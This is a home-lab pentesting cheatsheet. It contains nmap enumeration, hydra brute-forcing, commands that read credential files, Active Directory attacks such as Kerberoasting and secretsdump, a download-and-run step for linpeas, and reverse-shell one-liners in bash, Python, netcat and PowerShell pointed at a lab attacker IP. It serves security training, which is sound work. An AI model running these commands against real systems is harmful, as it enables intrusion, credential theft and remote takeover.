# ⚡ Lab Quick Reference Cheatsheet

> **Print this page or keep it open while practicing.** Quick commands for your home lab.

---

## 🔌 Lab Startup

```bash
# Start VMs (from VirtualBox command line)
VBoxManage startvm "Kali" --type headless
VBoxManage startvm "Metasploitable2" --type headless

# Or just open VirtualBox GUI and click Start on each VM
```

---

## 🌐 Lab IP Addresses

| Machine | IP Address | Credentials |
|---------|-----------|-------------|
| **Kali (Attacker)** | `192.168.56.10` | kali / kali |
| **Metasploitable (Target)** | `192.168.56.20` | msfadmin / msfadmin |
| **DVWA** | `http://192.168.56.20/dvwa/` | admin / password |

---

## 🔍 Quick Enumeration Commands

```bash
# Discover hosts on network
nmap -sn 192.168.56.0/24

# Quick port scan
nmap 192.168.56.20

# Full scan with service versions + scripts
nmap -sV -sC -A -p- 192.168.56.20 -oA full_scan

# Scan specific ports
nmap -sV -p 21,22,80,445 192.168.56.20

# UDP scan (top 20 ports)
sudo nmap -sU --top-ports 20 192.168.56.20

# Vulnerability scan
nmap --script vuln 192.168.56.20
```

---

## 🔑 Quick Brute Force Commands

```bash
# SSH
hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt 192.168.56.20 ssh -t 4

# FTP
hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt 192.168.56.20 ftp -t 4

# HTTP Basic Auth
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.56.20 http-get /

# Decompress rockyou.txt (first time only)
sudo gunzip /usr/share/wordlists/rockyou.txt.gz
```

---

## 📁 Quick File Transfer

```bash
# HTTP server (on Kali)
python3 -m http.server 8080

# Download (on target)
wget http://192.168.56.10:8080/file.txt
curl http://192.168.56.10:8080/file.txt -o file.txt

# Netcat transfer
# Receiver:
nc -lvnp 4444 > received.txt
# Sender:
nc 192.168.56.10 4444 < file.txt

# SCP
scp file.txt msfadmin@192.168.56.20:/tmp/
scp msfadmin@192.168.56.20:/etc/passwd ./
```

---

## 🐧 Linux PrivEsc Quick Checks

```bash
# Current user info
whoami && id

# Sudo permissions
sudo -l

# SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Writable directories
find / -writable -type d 2>/dev/null

# Cron jobs
cat /etc/crontab && ls -la /etc/cron*

# Readable shadow file?
cat /etc/shadow 2>/dev/null

# Running services as root
ps aux | grep root

# Kernel version (for kernel exploits)
uname -a

# Run LinPEAS
wget http://192.168.56.10:8080/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh
```

---

## 🪟 Windows PrivEsc Quick Checks

```powershell
# Current user + privileges
whoami /all

# System info
systeminfo

# List users
net user

# Check admin group
net localgroup administrators

# Scheduled tasks
schtasks /query /fo LIST

# Running services
wmic service list brief

# Find passwords in files
findstr /si password *.txt *.ini *.config

# PowerShell history
type %appdata%\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

# Run WinPEAS
.\winpeas.exe
```

---

## 🏢 AD Quick Commands

```bash
# Kerberoasting
impacket-GetUserSPNs domain/user:pass -dc-ip DC_IP -request

# AS-REP Roasting
impacket-GetNPUsers domain/ -dc-ip DC_IP -no-pass -usersfile users.txt

# PSExec
impacket-psexec domain/user:pass@TARGET_IP

# SMB enumeration
crackmapexec smb 192.168.56.0/24 -u user -p pass

# Dump credentials
impacket-secretsdump domain/admin:pass@DC_IP

# LLMNR Poisoning
sudo responder -I eth1 -rdw
```

---

## 🔄 Reverse Shell One-Liners

```bash
# Bash
bash -i >& /dev/tcp/192.168.56.10/4444 0>&1

# Python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("192.168.56.10",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'

# Netcat (traditional)
nc -e /bin/bash 192.168.56.10 4444

# Netcat (without -e)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.56.10 4444 >/tmp/f

# PowerShell
powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('192.168.56.10',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII.GetBytes($r)),0,$r.Length)}"

# Listener (on Kali)
nc -lvnp 4444
```

---

## 🔧 Shell Upgrade

```bash
# After getting a basic shell, upgrade to interactive
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Press Ctrl+Z to background
stty raw -echo; fg
# Press Enter twice
export TERM=xterm
```

---

## 📸 Snapshots (Save Your Progress!)

```
VirtualBox → Select VM → Snapshots tab → Take
```

| Snapshot Name | When to Take |
|--------------|-------------|
| `Clean-Install` | Right after setting up the VM |
| `Before-Attack-X` | Before trying a new exploit |
| `Post-Exploit` | After successful exploitation |

---

## 🧰 Useful Websites

| Site | URL | Purpose |
|------|-----|---------|
| GTFOBins | https://gtfobins.github.io | Linux binary exploitation |
| LOLBAS | https://lolbas-project.github.io | Windows binary exploitation |
| RevShells | https://www.revshells.com | Reverse shell generator |
| ExploitDB | https://www.exploit-db.com | Public exploits |
| HackTricks | https://book.hacktricks.xyz | Everything pentesting |
| CyberChef | https://gchq.github.io/CyberChef | Encoding/decoding tool |

---

**Happy Hacking! 🎯** Remember — only hack what you own!
